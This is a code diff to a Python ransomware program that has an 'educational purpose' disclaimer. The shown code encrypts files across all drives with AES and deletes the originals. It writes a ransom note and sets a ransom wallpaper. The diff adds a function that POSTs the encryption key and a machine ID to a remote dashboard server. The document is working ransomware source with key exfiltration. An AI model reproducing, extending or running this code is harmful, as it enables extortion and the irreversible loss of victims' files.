@@ -4,12 +4,15 @@ Author: Yakuza-D
 Disclaimer: this app written only and only for educational purpose
 """
 
-import ctypes
-import logging
-import os
+#import os
 import sys
-import uuid
-from os import makedirs
+from ctypes import windll
+import logging
+from uuid import uuid4
+from requests import post, exceptions
+from time import sleep
+from json import dumps
+from os import makedirs, path, remove, walk
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
@@ -23,27 +26,27 @@ from base64 import b64encode
 # Defining Function to load the current path of ransom.py and then join it to relative_path
 def resource_path(relative_path):
     # Get Directory name of the current python file
-    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    basePath = getattr(sys, '_MEIPASS', path.dirname(path.abspath(__file__)))
 
     # join relative_path to directory name of the current python file
-    return os.path.join(basePath, relative_path)
+    return path.join(basePath, relative_path)
 
 
 # Create Function to Ensure the time Directory Exist
 def ensure_time_dir_exist():
-    if not os.path.exists(TIME_DIR):
-        os.makedirs(TIME_DIR)
+    if not path.exists(TIME_DIR):
+        makedirs(TIME_DIR)
 
 
 # Create Function to Load Machine ID from all drives on the machine
 def load_machine_id():
     # Generate a list of all existence drives on the machine
-    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{x}:\\")]
+    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]
 
     # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
     for drive in drives:
-        machineIdPath = os.path.join(drive, 'Machine_id.txt')
-        if os.path.exists(machineIdPath):
+        machineIdPath = path.join(drive, 'Machine_id.txt')
+        if path.exists(machineIdPath):
             try:
                 with open(machineIdPath, 'r') as file:
                     machineId = file.read().strip()
@@ -64,13 +67,13 @@ SECONDARY_TERMINATION_KEY = "stop"
 # SECONDARY_TERMINATION_KEY = "davood"
 
 # get the current user's home directory
-HOME_DIR = os.path.expanduser('~')
+HOME_DIR = path.expanduser('~')
 
 # Create Path of Time Directory based on the current user's home directory
-TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')
+TIME_DIR = path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')
 
 # Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
-TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
+TIMER_STATE_FILE = path.join(TIME_DIR, 'timer_state.txt')
 
 # Path of application icons and images
 ICON_PATH = resource_path("img/app_icon.ico")
@@ -124,11 +127,11 @@ class EncryptionTool:
         self.dashboard_url = dashboard_url
         self.max_attempts = max_attempts
         self.delay = delay
-        self.key = self.generate_key(password)
-        self.machine_id = str(uuid.uuid4())
+        self.key = self.generate_key(password) # noqa
+        self.machine_id = str(uuid4())
 
     @staticmethod
-    def generate_key(self, password):
+    def generate_key(password):
         """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
         :param: password
         :return: key
@@ -151,10 +154,10 @@ class EncryptionTool:
 
     # Create Function to Set Wallpaper on the target machine after ransom running
     @staticmethod
-    def set_wallpaper(self, path):
+    def set_wallpaper(wallpaper_path):
         try:
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-            logging.info(f"[+] Wallpaper Set Successfully to {path}. ")
+            windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
+            logging.info(f"[+] Wallpaper Set Successfully to {wallpaper_path}. ")
         except Exception as e:
             logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")
 
@@ -163,8 +166,8 @@ class EncryptionTool:
     def create_important_files(directory_path):
         try:
             # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
-            dDataPath = os.path.join(directory_path, "D-Data")
-            os, makedirs(dDataPath, exist_ok=True)
+            dDataPath = path.join(directory_path, "D-Data")
+            makedirs(dDataPath, exist_ok=True)
 
             # Filenames must be created with fileContents
             filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
@@ -173,7 +176,7 @@ class EncryptionTool:
             # Iterate on all filenames and file contents
             for filename, content in zip(filenames, fileContents):
                 # join the filename path to the D-Data Directory path
-                filepath = os.path.join(dDataPath, filename)
+                filepath = path.join(dDataPath, filename)
 
                 # Create filename(important files) in the D-Data Directory
                 with open(filepath, 'w') as file:
@@ -206,7 +209,7 @@ class EncryptionTool:
                 file.write(iv + encryptedData)
 
             # Remove the Original file from target machine
-            os.remove(file_path)
+            remove(file_path)
 
             # Submit an Info Log from encryption to Log Console
             logging.info(f"[+] Encrypting {file_path} ...")
@@ -218,7 +221,7 @@ class EncryptionTool:
     def encrypt_files_in_directory(self, directory_path):
         try:
             # Split root(parents) directory, directory and files in directory
-            for root, dirs, files in os.walk(directory_path):
+            for root, dirs, files in walk(directory_path):
 
                 # If the directory uses fore recycle bin, jump to for loop
                 if "$RECYCLE.BIN" in root:
@@ -231,7 +234,7 @@ class EncryptionTool:
 
                     if any(file.endswith(ext) for ext in self.extensions):
                         # join a file to the root directory and then encrypt file using single file encrypt function
-                        filePath = os.path.join(root, file)
+                        filePath = path.join(root, file)
                         self.encrypt_file(filePath)
 
             # Submit Info Log for files encryption in the Log Console
@@ -249,7 +252,7 @@ In case of any issues or to obtain your decryption key, please contact your IT d
 Thank you,
 Your Security Team
 """
-        manualPath = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
+        manualPath = path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
         try:
             with open(manualPath, "w") as file:
                 file.write(manualContent)
@@ -257,12 +260,35 @@ Your Security Team
         except Exception as e:
             logging.error(f"[-] Failed to create user manual. Error: {str(e)}")
 
+    # Function to send the encryption key to the dashboard
+    def send_key_to_dashboard(self):
+        encoded_key = b64encode(self.key).decode('utf-8')
+        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
+        headers = {'Content-Type': 'application/json'}
+
+        for attempt in range(self.max_attempts):
+            logging.info(f"Attempt {attempt + 1} to send encryption key.")
+            try:
+                response = post(self.dashboard_url, headers=headers, data=dumps(payload))
+                if response.ok:
+                    logging.info('Key sent successfully. Response OK.')
+                    return True
+                else:
+                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
+            except exceptions.ConnectionError as e:
+                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
+            if attempt < self.max_attempts - 1:
+                sleep(self.delay)
+        logging.error("All attempts to send the key failed.")
+        return False
+
+
     # Function to save the encryption key locally
     def save_key_locally(self):
         # Create Hardcoded Path for saving key
-        keyPath = os.path.join('E:', 'encryption_key.txt')
+        keyPath = path.join('E:', 'encryption_key.txt')
         try:
-            os.makedirs(os.path.dirname(keyPath), exist_ok=True)
+            makedirs(path.dirname(keyPath), exist_ok=True)
 
             # Write Machine id & Encryption key to keyPath file
             with open(keyPath, "w") as file:
@@ -281,10 +307,10 @@ Your Security Team
     # Function to save the machine ID
     def save_machine_id(self, directory_path):
         # Create Hardcoded Path for Machine_id.txt which store the machine id
-        machineIdPath = os.path.join(directory_path, "Machine_id.txt")
+        machineIdPath = path.join(directory_path, "Machine_id.txt")
         try:
             # Create directory_path if the directory doesn't exist
-            os.makedirs(directory_path, exist_ok=True)
+            makedirs(directory_path, exist_ok=True)
 
             # Open Machine_id.txt and write 'self.machine_id' to this file
             with open(machineIdPath, "w") as file:
@@ -325,7 +351,8 @@ Your Security Team
 
         # create Path of wallpaper & Set wallpaper on the target machine
         wallpaperPath = resource_path("img/wallpaper.png")
-        self.set_wallpaper(wallpaperPath)
+
+        self.set_wallpaper(wallpaperPath) # noqa
         logging.info("[+] Wallpaper Set Successfully.")
         logging.info("[+] Encryption Process Completed. All files now encrypted.")
 
